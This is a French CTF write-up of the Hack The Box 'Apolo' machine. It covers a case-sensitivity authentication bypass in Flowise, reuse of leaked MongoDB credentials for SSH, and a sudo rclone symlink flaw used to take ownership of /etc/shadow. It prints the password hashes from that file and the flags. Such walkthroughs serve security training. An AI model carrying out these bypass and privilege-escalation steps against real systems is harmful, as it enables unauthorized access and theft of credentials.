---
title: HTB University CTF 2024 Binary Badlands - Apolo
date: 2024-12-13
tags: 
- web
- privesc
category: 
- ctf
- fullpwn
---

# Découverte du challenge

Sur l'ip, nmap retourne deux services: ssh et http.

On trouve un site web: http://apolo.htb/
En creusent un peu, on tombe sur un sous domaine : ai.apolo.htb

Ce sous domain héberge une instance de "Flowise AI". 
En cherchant sur interne, on tombe sur une vulnérabiltié permettant de bypasser le système d'authentification 

# Bypasser l'authentification (CVE-2024-31621) 

https://www.exploit-db.com/exploits/52001
```
The flowise version <= 1.6.5 is vulnerable to authentication bypass
vulnerability.
The code snippet

this.app.use((req, res, next) => {
>                 if (req.url.includes('/api/v1/')) {
>                     whitelistURLs.some((url) => req.url.includes(url)) ?
> next() : basicAuthMiddleware(req, res, next)
>                 } else next()
>             })


puts authentication middleware for all the endpoints with path /api/v1
except a few whitelisted endpoints. But the code does check for the case
sensitivity hence only checks for lowercase /api/v1 . Anyone modifying the
endpoints to uppercase like /API/V1 can bypass the authentication.
```

En utilisant cette vulnérabilité, on peut se connecter sur l'instance.
Dans la partie "Credentials", on retrouve les identifiants utilisée pour se connecter à la base de donnée du serveur. 

```
mongodb+srv://lewis:C0mpl3xi3Ty!_W1n3@cluster0.mongodb.net/myDatabase?retryWrites=true&w=majority
```
On essaie de se connecter à la machine via ssh sur l'utilisateur lewis et le mot de passe C0mpl3xi3Ty!_W1n3, et ça passe! 

# Privilege escalation (CVE-2024-52522)
En listant les doits de l'utilisateur lewis, on peut voir que : 
```
$ sudo -l
Matching Defaults entries for lewis on apolo:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lewis may run the following commands on apolo:
    (ALL : ALL) NOPASSWD: /usr/bin/rclone
```
On peut utiliser la commande /usr/bin/rclone en tant qu'utilisateur.

Ce programme importe une vulnérabilité modifiant permettant d'avoir une lecture arbitraire sur le fichier/répertoire de notre choix.

Typiquement, voici un test pour vérifier que la vuln fonctionne : 
```
lewis@apolo:~$ ln -s /etc/shadow /home/lewis/shadow
lewis@apolo:~$ sudo rclone copy /home/lewis/ /tmp/home_new --links --metadata --log-level=DEBUG
lewis@apolo:~$ ls -la /etc/shadow
-rwxrwxrwx 1 lewis lewis 1214 Dec  4 13:10 /etc/shadow
```

On peut voir que le fichier /etc/shadow appartient maintenant à notre utilisateur ! 
Ce qui nous permet de lire le fichier
```
lewis@apolo:~$ cat /etc/shadow
root:$6$tXGOWajYaarOSaBl$3ERntPuO48c8RpGIPf/qrfLqezppfW/t0wqRTpzjmaBLYLVWBj.TrLkgJdVKdQeh2cjoBwQ6dVU98ckLQgCCG0:20024:0:99999:7:::
daemon:*:18375:0:99999:7:::
bin:*:18375:0:99999:7:::
sys:*:18375:0:99999:7:::
sync:*:18375:0:99999:7:::
games:*:18375:0:99999:7:::
man:*:18375:0:99999:7:::
lp:*:18375:0:99999:7:::
mail:*:18375:0:99999:7:::
news:*:18375:0:99999:7:::
uucp:*:18375:0:99999:7:::
proxy:*:18375:0:99999:7:::
www-data:*:18375:0:99999:7:::
backup:*:18375:0:99999:7:::
list:*:18375:0:99999:7:::
irc:*:18375:0:99999:7:::
gnats:*:18375:0:99999:7:::
nobody:*:18375:0:99999:7:::
systemd-network:*:18375:0:99999:7:::
systemd-resolve:*:18375:0:99999:7:::
systemd-timesync:*:18375:0:99999:7:::
messagebus:*:18375:0:99999:7:::
syslog:*:18375:0:99999:7:::
_apt:*:18375:0:99999:7:::
tss:*:18375:0:99999:7:::
uuidd:*:18375:0:99999:7:::
tcpdump:*:18375:0:99999:7:::
landscape:*:18375:0:99999:7:::
pollinate:*:18375:0:99999:7:::
sshd:*:18389:0:99999:7:::
systemd-coredump:!!:18389::::::
lxd:!:18389::::::
usbmux:*:18822:0:99999:7:::
lewis:$6$BtGmTbbtNVkg/W2N$nLwk34e22.8xnscxEV2IfL0SD1xvuwWaVlAaQBGOWk2cGA9dfUpzXhONLr5wu8mGuzRX2ZEPm1NFuPeni4K9r1:20024:0:99999:7:::
fwupd-refresh:*:20041:0:99999:7:::
_laurel:!:20061::::::
``` 

De la même manière, on peut faire un lien symbolique avec /root pour obtenir les droits sur ce répertoire

# Résultat
```
lewis@apolo:~$ cat /root/root.txt 
HTB{cl0n3_rc3_f1l3}
lewis@apolo:~$ cat user.txt 
HTB{llm_ex9l01t_4_RC3}
```
